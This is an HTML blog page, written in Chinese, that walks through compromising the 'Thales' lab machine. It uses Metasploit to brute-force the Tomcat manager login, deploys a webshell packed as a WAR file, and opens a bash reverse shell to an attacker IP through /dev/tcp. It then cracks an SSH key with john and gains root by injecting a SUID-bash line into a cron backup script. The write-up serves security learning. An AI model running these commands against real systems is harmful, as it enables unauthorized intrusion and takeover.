@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>对Thales的渗透测试 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="对Thales的渗透测试">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/01/28/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="这个靶机还是要改网卡设置，见信息收集主机发现nmap192.168.59.0/24端口扫描nmap-sV-p-192.168.59.147Web渗透访问8080端口，发现这个网站需要登录，这个网站是ApacheTomcat&amp;#x2F;9.0.52，试试用msfconsole爆破一下123456msfconso">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">对Thales的渗透测试</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-01-28T09:22:00.000Z">2026-01-28</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-01-28T09:23:18.344Z">2026-01-28</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <p>这个靶机还是要改网卡设置，见<a href="Vulnhub/%E5%AF%B9jangow-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"></a></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p><code>nmap 192.168.59.0/24</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128153911.png"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -sV -p- 192.168.59.147</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128154008.png"></p>
+<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><p>访问8080端口，发现这个网站需要登录，这个网站是Apache Tomcat&#x2F;9.0.52，试试用msfconsole爆破一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search tomcat login</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhost 192.168.59.147</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><strong>search tomcat login​​</strong></p>
+<ul>
+<li>​​作用​​：在 Metasploit 的漏洞数据库中搜索与 ​​Tomcat 管理登录页面​​ 相关的漏洞利用模块（exploits）或辅助模块（auxiliary）。</li>
+<li><code>auxiliary/scanner/http/tomcat_mgr_login​​</code>：用于扫描 Tomcat 管理登录页面是否存在弱口令（默认账号 <code>tomcat:tomcat</code> 或 <code>admin:admin</code>）。<br>-<strong><code>set RHOSTS 192.168.109.159</code>​</strong>​  </li>
+<li>设置目标主机的 IP 地址为 <code>192.168.109.159</code>（即你要扫描的 Tomcat 服务器地址）。<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155000.png"><br>得到了账号密码<br><code>tomcat:role1</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128155410.png"><br>这里有文件上传功能是要部署的waf文件<br><strong>war文件是Java Web应用程序的一种打包格式，全称为Web Application Archive（Web应用归档文件）。</strong><br><strong>它本质上是一个压缩包（类似ZIP格式），包含了Web应用运行所需的所有资源，比如：</strong></li>
+<li><strong>Java类文件（.class）</strong></li>
+<li><strong>JSP页面</strong></li>
+<li><strong>HTML、CSS、JavaScript等静态资源</strong></li>
+<li><strong>配置文件（如web.xml）</strong></li>
+<li><strong>依赖的库文件（.jar）等</strong><br><strong>主要用途：</strong><br><strong>war文件便于Web应用的部署和传播。当把war文件放到Tomcat等Java Web服务器的指定目录（如webapps）时，服务器会自动解压并部署该应用，无需手动处理内部文件结构。</strong><br>所以我可以上传jsp木马文件压缩包<br>先写一个让哥斯拉生成一个木马文件<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162538.png"><br>压缩为ZIP，再把后缀改成war上传<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162618.png"><br>&#x2F;123&#x2F;123.jsp能成功访问到就可以连接了<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162524.png"><br>执行命令：<code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1&#39;</code>就可以拿到shell了<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128162920.png"><br>找到两个txt文件，查看user.txt文件，需要thales权限，查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 <code>/usr/local/bin/backup.sh</code><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128163744.png"><br><code>ls -la</code>可以看到有个<code>.ssh</code>文件<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164532.png"><br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164630.png"><br>里面还有公钥和私钥<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164736.png"><br>我们把它保存下来，用john进行爆破<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128165547.png"><br>我这里先将私钥保存到1.txt<br>然后使用命令<code>ssh2john 1.txt &gt; 2.txt</code><strong>将 SSH 私钥转换为 John the Ripper（简称 John）能够识别和破解的“哈希（Hash）”格式</strong><br>最后使用<code>john --wordlist=/usr/share/wordlists/rockyou.txt /root/2.txt</code>破解密码<br>（注：第一次使用需要解压rockyou.txt，命令如下<code>gunzip /usr/share/wordlists/rockyou.txt.gz</code>）<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170125.png"><br><strong>升级 Shell 获取 TTY</strong><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><strong>登录到用户thales</strong><code>su thales</code>，输入密码即可<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128170345.png"><br>拿到第一个flag</li>
+</ul>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>使用命令<code>ls -l /usr/local/bin/backup.sh</code>判断我们是否可写<br><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128164155.png"><br>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p>
+<h3 id="步骤-1：向脚本中注入恶意命令"><a href="#步骤-1：向脚本中注入恶意命令" class="headerlink" title="步骤 1：向脚本中注入恶意命令"></a>步骤 1：向脚本中注入恶意命令</h3><p>我们要往这个脚本的末尾添加一行代码。这行代码的作用是给 <code>/bin/bash</code> 设置 SUID 权限并复制到 <code>/tmp</code> 目录下，这样运行它时就拥有 root 权限了。</p>
+<p>执行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&quot;</span> &gt;&gt; /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-2：验证注入是否成功"><a href="#步骤-2：验证注入是否成功" class="headerlink" title="步骤 2：验证注入是否成功"></a>步骤 2：验证注入是否成功</h3><p>检查一下脚本最后一行是不是多了刚才写的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n 3 /usr/local/bin/backup.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-3：等待执行"><a href="#步骤-3：等待执行" class="headerlink" title="步骤 3：等待执行"></a>步骤 3：等待执行</h3><p>现在需要等待系统自动运行这个脚本。通常这种备份脚本是每分钟或每几分钟运行一次。可以不断查看 <code>/tmp</code> 目录，看看 <code>rootbash</code> 文件出现了没有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /tmp/rootbash</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤-4：获取-Root-Shell"><a href="#步骤-4：获取-Root-Shell" class="headerlink" title="步骤 4：获取 Root Shell"></a>步骤 4：获取 Root Shell</h3><p>一旦看到 <code>/tmp/rootbash</code> 出现，并且权限位有 <code>s</code>（例如 <code>-rwsr-xr-x</code>），立即执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure>
+<p><img src="/%E5%AF%B9Thales%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260128171636.png"><br>成功拿到root权限</p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>对Thales的渗透测试</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-01-28</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/01/27/%E5%AF%B901-Empire-Lupin-One%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对01-Empire-Lupin-One的渗透测试</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Web渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E5%90%91%E8%84%9A%E6%9C%AC%E4%B8%AD%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">步骤 1：向脚本中注入恶意命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F"><span class="toc-number">3.2.</span> <span class="toc-text">步骤 2：验证注入是否成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E7%AD%89%E5%BE%85%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.</span> <span class="toc-text">步骤 3：等待执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-4%EF%BC%9A%E8%8E%B7%E5%8F%96-Root-Shell"><span class="toc-number">3.4.</span> <span class="toc-text">步骤 4：获取 Root Shell</span></a></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
+            
+                <a href="/tags/Medium/" class="tag" aria-label="标签: #Medium">#Medium</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="分类: 内网渗透">
+                        内网渗透
+                        <span>(8)</span>
+                    </a>
+                </div>
+            
+                <div class="category-item">
+                    <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/" aria-label="分类: 靶机日记">
+                        靶机日记
+                        <span>(8)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
